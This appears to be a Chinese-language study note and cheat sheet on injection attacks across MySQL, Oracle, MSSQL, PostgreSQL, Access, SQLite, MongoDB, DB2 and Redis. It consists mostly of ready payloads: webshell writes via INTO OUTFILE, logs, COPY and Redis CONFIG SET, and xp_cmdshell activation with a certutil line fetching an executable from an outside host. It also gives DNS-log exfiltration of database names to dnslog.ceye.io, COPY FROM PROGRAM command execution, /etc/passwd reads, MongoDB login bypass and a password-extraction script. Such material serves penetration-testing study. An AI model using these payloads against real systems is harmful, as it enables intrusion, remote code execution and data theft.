# 2026-07-29 多数据库注入技术

## 一、常见数据库注入概览

| 数据库 | 系统信息表 | 字符串拼接 | 限制行数 | 注释 | 特色 |
|--------|-----------|-----------|---------|------|------|
| MySQL | information_schema | concat(), group_concat() | limit 0,1 | # --+ /**/ | INTO OUTFILE 写文件 |
| Oracle | all_tables, all_tab_columns | \|\| | rownum | -- | 必须带 FROM dual |
| MSSQL | sysobjects, syscolumns | + | top N | -- /**/ | xp_cmdshell 执行命令 |
| PostgreSQL | information_schema, pg_class | \|\| | limit N offset M | -- /**/ | pg_sleep(), lo_export |
| Access | 无系统表 | & | top N | 无多行注释 | 偏移注入 |
| SQLite | sqlite_master | \|\| | limit N offset M | -- /**/ | 轻量，无网络服务 |
| MongoDB | 无Schema | 无SQL语法 | 无SQL语法 | // | $ne/$regex/$where注入 |
| DB2 | sysibm.systables | \|\| | fetch first N rows | -- | 类似Oracle语法 |

---

## 二、MySQL 注入

### 2.1 基本信息获取

```sql
-- 版本
SELECT version()
SELECT @@version

-- 当前数据库
SELECT database()

-- 当前用户
SELECT user()
SELECT current_user()

-- 数据库路径
SELECT @@datadir

-- 操作系统
SELECT @@version_compile_os
```

### 2.2 信息搜集（information_schema）

```sql
-- 查所有库
SELECT schema_name FROM information_schema.schemata

-- 查某库所有表
SELECT table_name FROM information_schema.tables WHERE table_schema='库名'
-- 支持十六进制绕过引号
SELECT table_name FROM information_schema.tables WHERE table_schema=0xhex

-- 查某表所有字段
SELECT column_name FROM information_schema.columns WHERE table_name='表名'

-- 一次性爆所有数据（group_concat）
SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='库名'
SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='表名'
```

### 2.3 报错注入

```sql
-- floor + rand + group by (最多显示64位)
SELECT count(*), concat(version(), floor(rand(0)*2)) x FROM information_schema.tables GROUP BY x

-- updatexml (最多32位)
SELECT updatexml(1, concat(0x7e, version()), 1)

-- extractvalue (最多32位)
SELECT extractvalue(1, concat(0x7e, user()))

-- exp 溢出 (5.5.5+ 失效)
SELECT exp(~(SELECT * FROM (SELECT user())a))
```

### 2.4 文件操作

```sql
-- 读文件 (需要 FILE 权限)
SELECT load_file('/etc/passwd')
-- 十六进制绕过
SELECT load_file(0x2f6574632f706173737764)

-- 写文件 (需要 FILE 权限, secure_file_priv 允许)
SELECT '<?php @eval($_POST[1]);?>' INTO OUTFILE '/var/www/html/shell.php'

-- 日志写 shell
SET global general_log = 'ON'
SET global general_log_file = '/var/www/html/shell.php'
SELECT '<?php eval($_POST[1]);?>'

-- 慢日志写 shell
SET global slow_query_log = 'ON'
SET global slow_query_log_file = '/var/www/html/shell.php'
SELECT '<?php eval($_POST[1]);?>' FROM sleep(10)
```

### 2.5 时间盲注

```sql
-- sleep + if
SELECT if(substr(version(),1,1)='5', sleep(3), 0)

-- benchmark
SELECT if(substr(version(),1,1)='5', benchmark(50000000, md5(1)), 0)

-- 笛卡尔积延时 (无sleep时)
SELECT count(*) FROM information_schema.tables A, information_schema.tables B, information_schema.tables C
```

### 2.6 DNSLOG 外带

```sql
SELECT load_file(concat('\\\\', (SELECT database()), '.dnslog.ceye.io\\abc'))
-- UNC路径外带数据
```

---

## 三、Oracle 注入

### 3.1 特性

- 必须带 `FROM` 子句，查询无表时用 `FROM dual`
- 没有 `information_schema`，用 `all_tables` / `all_tab_columns`
- 字符串拼接用 `||`
- 限制行数用 `rownum`（注意写法和MySQL不同）

### 3.2 信息搜集

```sql
-- 版本
SELECT banner FROM v$version WHERE rownum=1

-- 当前用户
SELECT user FROM dual
-- 所有用户
SELECT username FROM all_users

-- 当前数据库名(SID)
SELECT instance_name FROM v$instance
SELECT global_name FROM global_name

-- 查所有表 (注意表名必须大写)
SELECT table_name FROM all_tables WHERE rownum=1
SELECT owner, table_name FROM all_tables

-- 查字段
SELECT column_name FROM all_tab_columns WHERE table_name='表名'
-- 查用户拥有的表
SELECT table_name FROM user_tables
```

### 3.3 报错注入

```sql
-- utl_inaddr.get_host_name (最常用)
SELECT utl_inaddr.get_host_name((SELECT user FROM dual)) FROM dual

-- ctxsys.drithsx.sn
SELECT ctxsys.drithsx.sn(1, (SELECT user FROM dual)) FROM dual

-- dbms_xdb_version.checkin
SELECT dbms_xdb_version.checkin((SELECT user FROM dual)) FROM dual

-- dbms_xdb_version.makeversioned
SELECT dbms_xdb_version.makeversioned((SELECT user FROM dual)) FROM dual

-- dbms_utility.sqlid_to_sqlhash
SELECT dbms_utility.sqlid_to_sqlhash((SELECT user FROM dual)) FROM dual
```

### 3.4 布尔/时间盲注

```sql
-- decode 布尔判断
SELECT decode(substr(user,1,1), 'A', 1, 0) FROM dual

-- instr 判断
SELECT instr(user, 'A', 1, 1) FROM dual

-- 时间盲注 (dbms_pipe.receive_message)
SELECT dbms_pipe.receive_message(('a'), 5) FROM dual
-- 如果条件为真，延时5秒
SELECT CASE WHEN (substr(user,1,1)='A') THEN dbms_pipe.receive_message(('x'), 5) ELSE 1 END FROM dual
```

### 3.5 联合查询

```sql
-- Oracle 必须指定 FROM，列数未知时用 null
UNION SELECT null, null, null FROM dual
-- 字符列用 'string'，数字列用 1
UNION SELECT 1, table_name, 1 FROM all_tables WHERE rownum=1
```

---

## 四、SQL Server (MSSQL) 注入

### 4.1 信息搜集

```sql
-- 版本
SELECT @@version

-- 当前数据库
SELECT db_name()

-- 当前用户 (是否sa)
SELECT user_name()
SELECT system_user

-- 主机名
SELECT host_name()
SELECT @@servername

-- 所有数据库
SELECT name FROM master.dbo.sysdatabases
SELECT name FROM master..sysdatabases

-- 当前库的所有表
SELECT name FROM sysobjects WHERE xtype='U'

-- 某表字段
SELECT name FROM syscolumns WHERE id=object_id('表名')
-- 或
SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='表名')
```

### 4.2 报错注入

```sql
-- convert 类型转换报错
SELECT convert(int, (SELECT user))

-- 1=cast
SELECT 1/(SELECT @@version)

-- 1=cast 配合常量
SELECT 1/@@version

-- openrowset + 类型报错 (常用于DNS外带)
```

### 4.3 联合查询

```sql
-- ORDER BY 判断列数
ORDER BY 1 -- 

-- UNION SELECT (需整数和字符串类型对齐)
UNION SELECT null, null -- 
-- 假设3列
UNION SELECT 1, db_name(), @@version
```

### 4.4 xp_cmdshell 命令执行

```sql
-- 开启 xp_cmdshell
EXEC sp_configure 'show advanced options', 1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE

-- 执行命令
EXEC master.dbo.xp_cmdshell 'whoami'
EXEC master..xp_cmdshell 'whoami'

-- 通过注入开启 (分号堆叠查询)
1; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE --
```

### 4.5 其他扩展存储过程

```sql
-- 写文件 (需sa权限)
EXEC sp_makewebtask '\\web\shell.asp', 'SELECT ''<%eval request("cmd")%>'''

-- 注册表操作
EXEC xp_regread HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\...'
EXEC xp_regwrite ...

-- 执行程序
EXEC xp_cmdshell 'certutil -urlcache -f http://x/a.exe c:\windows\temp\a.exe'
```

### 4.6 DNSLOG 外带

```sql
-- 需要先开启 xp_dirtree 或 xp_fileexist
DECLARE @a varchar(1024); SET @a=db_name(); EXEC('master..xp_dirtree "\\'+@a+'.dnslog.ceye.io\a"')
```

---

## 五、PostgreSQL 注入

### 5.1 信息搜集

```sql
-- 版本
SELECT version()

-- 当前用户
SELECT current_user
SELECT user

-- 当前数据库
SELECT current_database()

-- 获取所有表
SELECT table_name FROM information_schema.tables WHERE table_schema='public'
-- 或
SELECT relname FROM pg_stat_user_tables

-- 获取字段
SELECT column_name FROM information_schema.columns WHERE table_name='表名'
```

### 5.2 报错注入

```sql
-- PostgreSQL 报错注入较少，常用布尔/时间盲注
```

### 5.3 时间盲注

```sql
SELECT pg_sleep(5)
SELECT CASE WHEN (SELECT length(current_database()))=5 THEN pg_sleep(3) ELSE pg_sleep(0) END
```

### 5.4 文件操作

```sql
-- 读文件 (需要超级用户)
SELECT pg_read_file('/etc/passwd', 0, 10000)

-- 写文件 (需要超级用户)
COPY (SELECT '<?php @eval($_POST[1]);?>') TO '/tmp/shell.php'

-- lo_import / lo_export 大对象文件操作
SELECT lo_import('/etc/passwd')
SELECT lo_export(oid, '/tmp/output')
```

### 5.5 命令执行

```sql
-- PostgreSQL 9.3+ 版本特定
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
```

---

## 六、MongoDB NoSQL 注入

### 6.1 基本原理

MongoDB 不使用 SQL 语法，注入发生在 JSON/BSON 查询结构中。主要出现在 PHP、Node.js 等后端将用户输入直接拼入查询对象时。

### 6.2 常见注入 Payload

**判断注入点（$ne / $gt）**

```javascript
// 正常请求
username=admin&password=123456

// 注入测试 — 使用 $ne (not equal)
username[$ne]=x&password[$ne]=x
// 等同于 {"username": {"$ne": "x"}, "password": {"$ne": "x"}}
// 将返回第一个不是 "x" 的用户，可能直接登录

// $gt 判断
username[$gt]=&password[$gt]=
```

**正则注入 ($regex)**

```javascript
// 逐字符猜解密码
username=admin&password[$regex]=^a
// 如果密码以 a 开头，登录成功

// 长度判断
username=admin&password[$regex]=^.{6}$
// 判断密码是否为6位
```

**JavaScript 注入 ($where)**

```javascript
// 如果应用使用了 $where
{$where: "this.username == 'admin' && this.password.length == 6"}

// 延时注入
{$where: "sleep(5000)"}

// 报错回显
{$where: "function(){ return db.version() }"}
```

**$lookup 联表查询注入**

```javascript
// Mongoose / aggregation pipeline
[{$lookup: {from: "users", pipeline: [], as: "result"}}]
```

### 6.3 盲注脚本思路

```python
import requests
import string

chars = string.ascii_lowercase + string.digits
password = ""

for i in range(1, 20):
    for c in chars:
        payload = {"username": "admin", "password": {"$regex": f"^{password}{c}"}}
        r = requests.post(url, json=payload)
        if "success" in r.text:
            password += c
            print(f"[+] Found: {password}")
            break
```

### 6.4 MongoDB 版本/信息获取

```javascript
db.version()
db.getName()
db.stats()
```

---

## 七、Access 数据库注入（重点）

### 7.1 Access 特性

- **无系统信息表** — 没有 information_schema，没有 sysobjects
- **只能靠猜** — 库名、表名、列名全靠暴力猜解
- **无多行注释** — 不支持 `/* */`，只支持 `--` (部分情况)
- **字符串拼接用 `&`** — 不是 `concat()` 或 `||`
- **字符截取** — 用 `mid()` 而非 `substr()`，`asc()` 而非 `ascii()`
- **TOP N 限制行数** — 非 `limit`
- **无堆叠查询** — 不支持 `;` 执行多语句

### 7.2 判断注入点

```
# 数值型
?id=1 and 1=1  正常
?id=1 and 1=2  异常

# 字符型
?id=1' and '1'='1  正常
?id=1' and '1'='2  异常
```

### 7.3 猜解表名和列名

```sql
-- Access 没有系统表，使用常见的字典暴力猜解
-- 常见表名: admin, users, user, member, members, news, article, config, manage, manager

-- 猜表名
AND EXISTS (SELECT * FROM admin)  -- 表 admin 是否存在
AND (SELECT count(*) FROM admin) > 0

-- 猜列名
AND EXISTS (SELECT username FROM admin)  -- 列 username 是否存在
AND (SELECT count(username) FROM admin) > 0

-- 常见列名: id, username, user, password, pass, pwd, admin, name, email
```

### 7.4 联合查询（列数判断）

```sql
-- ORDER BY 判断列数
ORDER BY 1
ORDER BY 2
...
-- 到报错为止，确定列数

-- UNION 联合查询
UNION SELECT 1,2,3,4,5 FROM admin
-- 看哪个数字回显，确定回显列

-- 联合查询爆数据
UNION SELECT 1, username, password, 4, 5 FROM admin
```

### 7.5 偏移注入（Access 核心技巧）★

**原理：** Access 无法获取列名时，通过调整查询的前置 NULL 数量，"偏移"到目标表的列上。

**适用场景：** 已知某个表名和其列数（如 admin 表有 5 列），但不知列名，目标表（如 user）有更多列。

```sql
-- 假设已知 admin 表有 3 列，当前注入点为 10 列
-- admin 表结构: id, username, password (猜测列数=3)

-- 基本 UNION
UNION SELECT 1,2,3,4,5,6,7,8,9,10 FROM admin
-- 回显的是 admin 表的数据

-- 现在需要获取 user 表的数据(列数未知)
-- 偏移注入: 调整 SELECT 中 admin.* 前面的 NULL 数量

-- 步骤1: 先确认 admin 表能 UNION 出数据
UNION SELECT 1,2,3,4,5,6,7,8,9,10 FROM admin

-- 步骤2: 用 admin.* 替换，减少占位
UNION SELECT 1,2,3,4,5,6,7,admin.* FROM admin
-- admin.* 代表3列，占3个位置

-- 步骤3: 计算偏移
-- 当前查询: 10列，admin.* 占3列，前置7个int
-- 改为: UNION SELECT 1,2,3,4,5,admin.*,8,9,10 FROM user
-- admin.* 现在映射到 user 表的第6,7,8列

-- 步骤4: 调偏移量使数据逐列"移位"
UNION SELECT admin.*,1,2,3,4,5,6,7 FROM admin    -- admin.* 在最前
UNION SELECT 1,admin.*,2,3,4,5,6,7 FROM admin    -- admin.* 前移1
UNION SELECT 1,2,admin.*,3,4,5,6,7 FROM admin    -- admin.* 前移2
...
-- 逐"层"偏移，每次看到的回显数据会发生变化
-- 从回显位置推测出 user 表的列结构
```

**偏移注入公式：**

```
当前注入的列数 = N
已知表(admin)的列数 = M
偏移量 = N - M (即用 admin.* 替换后，可偏移的最大位数)

每次递增前置 NULL 数为 offset
UNION SELECT <offset个NULL>, admin.*, <剩余NULL> FROM admin
```

**实战偏移步骤：**

```sql
-- 已知 admin 表有 5 列，当前页面列数 22

-- Level 0: admin.* 在最靠后的位置
UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,admin.* FROM admin

-- Level 1: admin.* 向前偏移1位
UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,admin.*,22 FROM admin

-- Level 2:
UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,admin.*,21,22 FROM admin

-- 逐级观察回显变化
-- 同时切换目标表尝试:
UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,user.* FROM user
-- (如果 user 表也是5列的话)
```

### 7.6 Access 盲注

```sql
-- 布尔盲注 (asc + mid)
AND (SELECT asc(mid(username,1,1)) FROM admin WHERE id=1) > 97
-- 注意: Access 用 asc() 而非 ascii(), mid() 而非 substr()

-- IIF 布尔注入
AND (SELECT IIF(asc(mid(username,1,1))>97, 1, 0) FROM admin WHERE id=1)

-- 逐字符猜解
AND (SELECT top 1 asc(mid(username,1,1)) FROM admin) = 97  -- 'a'

-- 长度判断
AND (SELECT top 1 len(username) FROM admin) = 5
```

### 7.7 Access 常用函数

| 功能 | Access 函数 | MySQL 对应 |
|------|------------|-----------|
| ASCII值 | asc() | ascii() 或 ord() |
| 截取字符串 | mid(s,p,n) | substr() / substring() |
| 字符串长度 | len() | length() |
| 拼接 | & 或 + | concat() |
| 条件 | IIF(cond,t,f) | if(cond,t,f) / case when |
| 前N条 | TOP N | limit N |
| 类型转换 | cstr(), cint() | cast() / convert() |

### 7.8 跨库查询

```sql
-- Access 支持跨库查询，前提是知道路径
SELECT * FROM [;DATABASE=C:\path\to\other.mdb].table
SELECT * FROM 表名 IN 'C:\path\to\other.mdb'
```

---

## 八、SQLite 注入

### 8.1 信息搜集

```sql
-- 版本
SELECT sqlite_version()

-- 万能主表 (唯一的系统信息表)
SELECT * FROM sqlite_master
SELECT name, sql FROM sqlite_master WHERE type='table'
SELECT group_concat(name) FROM sqlite_master WHERE type='table'
SELECT group_concat(sql) FROM sqlite_master WHERE type='table'  -- 获取建表SQL

-- type 可能值: table, index, view, trigger
```

### 8.2 盲注

```sql
-- 布尔盲注
AND substr((SELECT name FROM sqlite_master LIMIT 1),1,1)='a'

-- 随机数 sleep (无原生sleep)
AND randomblob(100000000)        -- 大随机blob延时

-- LIKE 盲注
AND (SELECT name FROM sqlite_master WHERE type='table' LIMIT 1) LIKE 'a%'

-- 没有 SELECT ... INTO OUTFILE, 不能直接写文件
```

### 8.3 联合注入

```sql
-- 判断列数
ORDER BY 1 --

-- UNION
UNION SELECT 1,2,3,group_concat(name),5 FROM sqlite_master
```

---

## 九、DB2 注入简述

### 9.1 信息搜集

```sql
-- 版本
SELECT versionnumber FROM sysibm.sysversions

-- 表
SELECT name FROM sysibm.systables WHERE type='T'
SELECT tabname FROM syscat.tables

-- 列
SELECT colname FROM syscat.columns WHERE tabname='表名'
```

### 9.2 盲注

```sql
-- 没有原生延时函数，使用大量计算
-- 布尔盲注配合 SUBSTR 逐字符猜解
```

---

## 十、各数据库注入速查对比

### 10.1 字符串截取函数

| 数据库 | 截取函数 | 长度函数 |
|--------|---------|---------|
| MySQL | substr(), substring(), mid() | length(), char_length() |
| Oracle | substr() | length() |
| MSSQL | substring() | len() |
| PostgreSQL | substr(), substring() | length() |
| Access | mid() | len() |
| SQLite | substr() | length() |

### 10.2 ASCII 转换

| 数据库 | ASCII取值 | 字符转ASCII |
|--------|-------|------------|
| MySQL | ascii(), ord() | char() |
| Oracle | ascii() | chr() |
| MSSQL | ascii() | char() |
| PostgreSQL | ascii() | chr() |
| Access | asc() | chr() |
| SQLite | unicode() | char() |

### 10.3 注释符

| 数据库 | 行注释 | 块注释 |
|--------|-------|--------|
| MySQL | # --+ -- | /**/ |
| Oracle | -- | /**/ |
| MSSQL | -- | /**/ |
| PostgreSQL | -- | /**/ |
| Access | -- | **不支持** |
| SQLite | -- | /**/ |

### 10.4 无列名注入（通用技巧）

当不知道列名时，可以利用临时表别名、`as` 重命名等技巧。例如 MySQL 中：

```sql
-- 将查询结果当作子查询，给列起别名即可引用
SELECT c.1, c.2, c.3 FROM (SELECT 1,2,3 UNION SELECT * FROM users) c
-- 列名变成 1,2,3 ... 数字索引
```

### 10.5 判断数据库类型的方法

```
1. 根据中间件组合推断 (ASP + Access, PHP + MySQL, JSP + Oracle, ASPX + MSSQL)
2. 注释符猜测
3. 字符串拼接符测试
4. 特有函数探测 (len() -> Access, len() -> MSSQL, length() -> MySQL/Oracle)
5. 报错信息特征 (Jet engine -> Access, ORA- -> Oracle)
```

---

## 十一、NoSQL 注入拓展

### 11.1 Redis 未授权访问

Redis 通常不存在传统 SQL 注入，但存在未授权访问漏洞：

```bash
redis-cli -h target_ip
> CONFIG SET dir /var/www/html
> CONFIG SET dbfilename shell.php
> SET shell "<?php @eval($_POST[1]);?>"
> SAVE
```

### 11.2 CouchDB 注入

```javascript
// CouchDB 使用 JSON
// 选择器注入
{"selector": {"username": {"$eq": "admin"}, "password": {"$regex": "^a"}}}
```

### 11.3 Cassandra CQL 注入

CQL 语法类似 SQL，存在传统注入风险：

```sql
SELECT * FROM users WHERE username='admin' AND password='' OR 1=1 ALLOW FILTERING'
```

---

> **核心要点：** MySQL 用 information_schema + group_concat 最方便；Oracle 必须带 FROM dual + all_tables；MSSQL 强在 xp_cmdshell 执行命令；PostgreSQL 可以 COPY FROM PROGRAM 执行命令；Access 只能猜 + 偏移注入；MongoDB 是 JSON 结构注入不是 SQL。偏移注入是 Access 的灵魂技巧 — 在不知道列名的情况下，通过调整 UNION SELECT 中已知表列的位置，逐层"偏移"来映射出未知表的数据。